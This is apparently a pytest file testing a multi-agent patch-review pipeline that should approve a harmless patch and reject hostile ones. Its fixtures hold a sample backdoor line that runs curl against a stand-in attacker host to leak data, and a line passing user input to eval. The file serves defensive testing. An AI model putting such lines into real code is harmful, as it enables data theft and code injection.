import pytest
from tachyon.pipeline.orchestrator import run_supervisor

def test_triad_debate_safe_patch():
    """Verify that a safe patch passes the full Triad with concurrence."""
    # We use a placeholder URL and cve_context
    url = "https://safe-patch-source.com"
    context = {
        "id": "CVE-2026-0001",
        "patch_files": {
            "utils.py": "def safe_func():\n    return 'Hello World'"
        }
    }
    
    # Run the supervisor triad
    final_state = run_supervisor(url, cve_context=context)
    
    # Assertions
    assert "critique" in final_state
    assert "verdict" in final_state
    assert final_state["verdict"]["concurrence"] is True
    assert final_state["verdict"]["status"] == "approved"

def test_triad_debate_malicious_patch():
    """Verify that a malicious patch is caught by the Skeptic and rejected by the Meta-Critic."""
    url = "https://malicious-patch-source.com"
    context = {
        "id": "CVE-2026-6666",
        "patch_files": {
            "backdoor.py": "import os\nos.system('curl http://attacker.com/leak')"
        }
    }
    
    # Run the supervisor triad
    final_state = run_supervisor(url, cve_context=context)
    
    # Assertions
    assert "critique" in final_state
    assert final_state["critique"]["risk_score"] >= 0.4
    assert "verdict" in final_state
    assert final_state["verdict"]["status"] == "rejected"
    assert "Rejected due to high risk score" in final_state["verdict"]["justification"]

def test_triad_debate_unsafe_eval():
    """Verify that unsafe eval usage is caught by the Triad."""
    url = "https://unsafe-eval.com"
    context = {
        "id": "CVE-2026-9999",
        "patch_files": {
            "logic.py": "x = eval(input('Enter logic: '))"
        }
    }
    
    final_state = run_supervisor(url, cve_context=context)
    
    assert final_state["critique"]["risk_score"] >= 0.5
    assert final_state["verdict"]["status"] == "rejected"
    assert "unsafe_eval_pattern" in final_state["critique"]["detected_anomalies"]
